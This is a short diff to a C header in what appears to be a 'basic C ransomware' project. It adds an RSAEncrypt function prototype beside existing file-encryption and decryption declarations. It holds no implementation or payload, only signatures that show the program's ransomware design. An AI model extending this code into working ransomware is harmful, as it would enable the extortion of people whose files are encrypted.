@@ -5,6 +5,7 @@
 #ifndef BASIC_C_RANSOMWARE_ENCRYPTION_H
 #define BASIC_C_RANSOMWARE_ENCRYPTION_H
 
+void RSAEncrypt(const unsigned char *data, size_t dataSize, const char *filename, const char *rsaPublicKeyPEM);
 void encrypt_file(unsigned char key[32], unsigned char iv[16], unsigned char aad[], char file_path[]);
 void decryptFile(unsigned char key[32], unsigned char iv[16], unsigned char aad[], char file_path[]);
 void handleErrors(void);
